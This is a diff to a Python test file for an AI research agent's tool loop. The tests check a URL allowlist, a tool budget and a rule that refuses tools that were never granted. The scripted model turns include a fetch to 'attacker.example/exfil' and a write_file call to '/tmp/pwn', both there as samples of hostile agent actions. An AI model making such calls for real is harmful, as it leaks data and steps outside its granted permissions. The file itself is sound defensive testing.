@@ -4,6 +4,8 @@ network or a key."""
 from types import SimpleNamespace
 
 import pytest
+from langchain_core.language_models.fake_chat_models import FakeMessagesListChatModel
+from langchain_core.messages import AIMessage
 
 from app.schemas import ClaimVerification, EvidenceMatrix, IntakeAnswers, ProfileVerification
 from app.screener import agent as agent_module
@@ -80,47 +82,45 @@ def test_audit_leaves_unverified_alone():
 
 # ---- the loop itself, with a scripted model ----
 
-def _fc(name, **args):
-    return SimpleNamespace(
-        text=None, thought=False,
-        function_call=SimpleNamespace(name=name, args=args),
+def _tool_call_msg(*calls):
+    return AIMessage(
+        content="",
+        tool_calls=[
+            {"name": name, "args": args, "id": f"call_{i}"}
+            for i, (name, args) in enumerate(calls)
+        ],
     )
 
 
-def _text_part(text):
-    return SimpleNamespace(text=text, thought=False, function_call=None)
+class ScriptedChatModel(FakeMessagesListChatModel):
+    """Scripted turns for the deepagents loop; tool binding is a no-op so
+    the script alone decides what the 'model' calls."""
 
-
-def _response(parts):
-    content = SimpleNamespace(parts=parts, role="model")
-    return SimpleNamespace(
-        candidates=[SimpleNamespace(content=content)], usage_metadata=None
-    )
+    def bind_tools(self, tools, **kwargs):
+        return self
 
 
 @pytest.fixture
 def scripted_agent(monkeypatch):
     """Model turns: search → fetch(seen url) + fetch(unseen url) → done."""
     turns = [
-        _response([_fc("search_web", query="MICCAI Best Paper Award 2023 winner")]),
-        _response([
-            _fc("fetch_page", url="https://miccai.example/awards"),
-            _fc("fetch_page", url="https://attacker.example/exfil"),
-        ]),
-        _response([_text_part("Investigation complete.")]),
+        _tool_call_msg(
+            ("search_web", {"query": "MICCAI Best Paper Award 2023 winner"}),
+        ),
+        _tool_call_msg(
+            ("fetch_page", {"url": "https://miccai.example/awards"}),
+            ("fetch_page", {"url": "https://attacker.example/exfil"}),
+        ),
+        AIMessage(content="Investigation complete."),
     ]
-    calls = {"n": 0}
 
-    class FakeModels:
-        async def generate_content(self, model, contents, config):
-            turn = turns[min(calls["n"], len(turns) - 1)]
-            calls["n"] += 1
-            return turn
-
-    class FakeClient:
-        aio = SimpleNamespace(models=FakeModels())
-
-    monkeypatch.setattr(agent_module, "make_client", lambda s: FakeClient())
+    monkeypatch.setattr(
+        agent_module,
+        "make_agent_model",
+        lambda settings, live=False: ScriptedChatModel(responses=list(turns)),
+    )
+    # Distillation client is unused by the faked call_gemini below.
+    monkeypatch.setattr(agent_module, "make_client", lambda s: None)
 
     async def fake_search(query, settings):
         return "The award page confirms the 2023 winner.", ["https://miccai.example/awards"]
@@ -145,7 +145,6 @@ def scripted_agent(monkeypatch):
         )
 
     monkeypatch.setattr(agent_module, "call_gemini", fake_distill)
-    return calls
 
 
 async def test_agent_loop_budget_allowlist_and_audit(scripted_agent):
@@ -172,6 +171,33 @@ async def test_agent_loop_budget_allowlist_and_audit(scripted_agent):
     # Activity feed saw genuine tool activity.
     kinds = [e["type"] for e in events]
     assert "tool_call" in kinds and "tool_result" in kinds
+
+
+async def test_non_granted_tool_call_is_blocked():
+    """Grants are structural: a model call to a deepagents builtin outside
+    the granted registry is refused at the execution layer, not just hidden
+    from the declarations."""
+    from app.kernel.agent import AgentBudget, run_tool_loop
+    from app.kernel.tools.registry import ToolContext
+    from app.screener.agent import _build_registry
+
+    turns = [
+        _tool_call_msg(("write_file", {"file_path": "/tmp/pwn", "content": "x"})),
+        AIMessage(content="done."),
+    ]
+    transcript = AgentTranscript()
+    ctx = ToolContext(
+        settings=SimpleNamespace(), transcript=transcript,
+        emit=lambda e: None, node="t",
+    )
+    await run_tool_loop(
+        model=ScriptedChatModel(responses=turns),
+        task_prompt="p",
+        tools=_build_registry(),
+        budget=AgentBudget(max_tool_calls=5),
+        ctx=ctx,
+    )
+    assert transcript.tool_calls == 0  # nothing granted was ever dispatched
 
 
 async def test_agent_respects_tool_budget(scripted_agent, monkeypatch):
